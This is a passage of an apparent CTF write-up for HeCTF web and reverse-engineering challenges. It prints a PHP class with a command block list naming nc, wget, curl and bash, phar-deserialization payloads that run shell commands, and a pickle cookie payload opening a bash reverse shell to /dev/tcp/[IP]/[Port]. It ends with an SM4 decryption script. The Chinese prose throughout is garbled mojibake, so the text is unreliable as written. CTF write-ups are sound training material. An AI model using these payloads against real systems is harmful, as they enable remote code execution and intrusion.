class="function"><span class="keyword">function</span> <span class="title">create_image_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sha1(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] . time() . mt_rand());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span>(<span class="params"><span class="variable">$imagekey</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> !== preg_match(<span class="string">&#x27;/[0-9a-f]&#123;40&#125;/&#x27;</span>, <span class="variable">$imagekey</span>)) &#123;</span><br><span class="line">        fatal(<span class="string">&#x27;Invalid image key.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$im</span> = imagecreatefrompng(<span class="string">&quot;uploads/<span class="subst">&#123;$imagekey&#125;</span>.png&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$im</span>) &#123;</span><br><span class="line">        fatal(<span class="string">&#x27;Failed to load image.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$im</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hectf) &amp;&amp; !preg_match(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="keyword">$this</span>-&gt;hectf) &amp;&amp; intval(<span class="keyword">$this</span>-&gt;hectf))</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;No no no no no!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        exec(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œå›¾ç‰‡ä¸Šä¼ ç‚¹+<code>file_exists()</code>å‡½æ•°+è‡ªå®šä¹‰<code>HeCTF</code>ç±»ï¼Œåˆ¤æ–­ä¸ºæ–‡ä»¶ä¸Šä¼ +pharååºåˆ—åŒ–åˆ©ç”¨ã€‚</p><p><code>HeCTF</code>ç±»ä¸­RCEä½¿ç”¨ <code>tee</code> å‘½ä»¤ç»•è¿‡è¿‡æ»¤å†™æ–‡ä»¶ã€‚</p><p>æ„é€ pharæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> HeCTF();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;ls / | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹ä¸ºpngåç¼€ä¸Šä¼ ï¼Œåœ¨index.phpä»¥POSTæ–¹å¼ä¼ å…¥fileå€¼ï¼Œåˆ©ç”¨pharä¼ªåè®®ååºåˆ—åŒ–RCEï¼š</p><p><code>POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png</code></p><p>è¯»åˆ°flagæ–‡ä»¶å <code>/ffflllllaaaaggg</code>ï¼ŒåŒæ ·æ“ä½œæ„é€ è¯»flagå†…å®¹çš„pharæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> HeCTF();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;cat /ffflllllaaaaggg | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="çš®æ‰£çš„å•†åº—"><a href="#çš®æ‰£çš„å•†åº—" class="headerlink" title="çš®æ‰£çš„å•†åº—"></a>çš®æ‰£çš„å•†åº—</h3><p>è¿›å…¥é¡µé¢å‘ç°å¯ä»¥ç‚¹å‡»æŒ‰é’®ï¼Œä½†æ˜¯æ²¡é’±å¯ç”¨ï¼Œç‚¹å‡»æ—¶å‘ç°cookieæ˜¯å˜åŒ–çš„ã€‚</p><p>cookieåƒbase64ï¼Œè§£ç ï¼Œç»“åˆé¢˜ç›®å¯çŸ¥ä¸ºjsonçš„pickleåºåˆ—åŒ–ç»“æœï¼Œåæ¨ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(b64decode(enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>å¯è§ä½¿ç”¨äº†hmacå“ˆå¸Œï¼Œæ— æ³•çˆ†ç ´ï¼Œä½†å¯ä»¥æ„é€ RCEä»£ç åºåˆ—åŒ–åæ”¾å…¥cookieï¼Œç‚¹å‡»æŒ‰é’®æ‰§è¡Œæ¶æ„ä»£ç ï¼Œç”±äºé¡µé¢æ— ç»“æœå›æ˜¾ï¼Œæ„é€ åå¼¹shellä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;bash -c \&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\&quot;&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>æ›¿æ¢cookieåï¼Œç‚¹å‡»æŒ‰é’®å³å¯åœ¨vps getshellæ‹¿flagã€‚</p><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="è´æ–¯"><a href="#è´æ–¯" class="headerlink" title="è´æ–¯"></a>è´æ–¯</h3><p>å˜è¡¨base32ï¼ŒCyberchefä¸€æŠŠæ¢­å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><blockquote><p>å¦‚ä½•åˆ†æApkå‘¢</p></blockquote><p>ç”¨jadxæ‰“å¼€apkï¼Œåœ¨AndroidManifest.xmlé‡Œå‘ç°ï¼š</p><p><code>&lt;meta-data android:name=&quot;çˆ¶æ‹‰å“¥&quot; android:value=&quot;ä»˜æ‹‰å“¥å¤´&#123;Apktool_or_jadx&#125;&quot;/&gt;</code></p><p>flagï¼š<code>HECTF&#123;Apktool_or_jadx&#125;</code></p><p>â€‹    </p><h3 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h3><blockquote><p>ç®€å•çš„ios</p></blockquote><p>æ‰¾åˆ°å…³é”®åŠ å¯†å‡½æ•°ï¼Œç®€å•å¼‚æˆ–è¿˜åŸflagã€‚</p><p>â€‹    </p><h3 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h3><blockquote><p>easy reverse</p></blockquote><p>åŠ å¯†é€»è¾‘å¾ˆéš¾çœ‹ï¼Œåˆ©ç”¨IDAçš„findcryptæ’ä»¶å¯ä»¥è¯†åˆ«å‡ºå­˜åœ¨SM4åŠ å¯†ç®—æ³•çš„å…³é”®å‚æ•°æ•°ç»„ã€‚</p><p>åˆ©ç”¨åŠ¨è°ƒæ‰¾åˆ°SM4åŠ å¯†ä½¿ç”¨çš„128ä½keyå€¼ï¼Œå¯¼å‡ºhexï¼š<code>AD763B4FCDCFD9251089FB0408A45F80</code>ï¼Œä»¥åŠ128bitå¯†æ–‡ï¼Œå¯¼å‡ºhexï¼š<code>D75CDA22176DD392A1A570915F66A61C</code>ã€‚</p><p>æ‰¾ä¸€ä¸ªSM4ç®—æ³•çš„pythonè„šæœ¬è§£å¯†å¾—åˆ°flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SM4Cipher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(key) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;SM4 key must be length of 16. &quot;</span>)</span><br><span class="line">        self._key_r = self._generate_key(key)</span><br><span class="line">        self.block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(plaintext, self._key_r)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> self._do(ciphertext, self._key_r[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_do</span>(<span class="params">self, text: <span class="built_in">bytes</span>, key_r: <span class="built_in">list</span></span>):</span></span><br><span class="line">        text_ = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># å°† 128bit è½¬åŒ–æˆ 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            text_[i] = <span class="built_in">int</span>.from_bytes(text[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = text_[<span class="number">1</span>] ^ text_[<span class="number">2</span>] ^ text_[<span class="number">3</span>] ^ key_r[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            temp = text_[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">2</span>) ^ self._rot_left(box_out, <span class="number">10</span>)</span><br><span class="line">            temp = temp ^ self._rot_left(box_out, <span class="number">18</span>) ^ self._rot_left(box_out, <span class="number">24</span>)</span><br><span class="line">            text_ = text_[<span class="number">1</span>:] + [temp]</span><br><span class="line">        text_ = text_[::-<span class="number">1</span>]  <span class="comment"># ç»“æœé€†åº</span></span><br><span class="line">        <span class="comment"># å°† 4x32bit åˆå¹¶æˆ 128bit</span></span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            result.extend(text_[i].to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_generate_key</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¯†é’¥ç”Ÿæˆ&quot;&quot;&quot;</span></span><br><span class="line">        key_r, key_temp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)], [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        FK = [<span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span>]</span><br><span class="line">        CK = [<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>, <span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">              <span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>, <span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">              <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">              <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>]</span><br><span class="line">        <span class="comment"># å°† 128bit æ‹†åˆ†æˆ 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            temp = <span class="built_in">int</span>.from_bytes(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            key_temp[i] = temp ^ FK[i]</span><br><span class="line">        <span class="comment"># å¾ªç¯ç”Ÿæˆè½®å¯†é’¥</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = key_temp[<span class="number">1</span>] ^ key_temp[<span class="number">2</span>] ^ key_temp[<span class="number">3</span>] ^ CK[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            key_r[i] = key_temp[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">13</span>) ^ self._rot_left(box_out, <span class="number">23</span>)</span><br><span class="line">            key_temp = key_temp[<span class="number">1</span>:] + [key_r[i]]</span><br><span class="line">        <span class="keyword">return</span> key_r</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_s_box</span>(<span class="params">n: <span class="built_in">int</span></span>):</span></span><br><span class="line">        BOX = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>,</span><br><span class="line">               <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>,</span><br><span class="line">               <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>,</span><br><span class="line">               <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>,</span><br><span class="line">               <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>,</span><br><span class="line">               <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>,</span><br><span class="line">               <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">               <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>,</span><br><span class="line">               <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">               <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>,</span><br><span class="line">               <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>,</span><br><span class="line">               <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>,</span><br><span class="line">               <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>,</span><br><span class="line">               <span class="number">0x48</span>]</span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># å°† 32bit æ‹†åˆ†æˆ 4x8bitï¼Œä¾æ¬¡è¿›è¡ŒSç›’å˜æ¢</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(n.to_bytes(<span 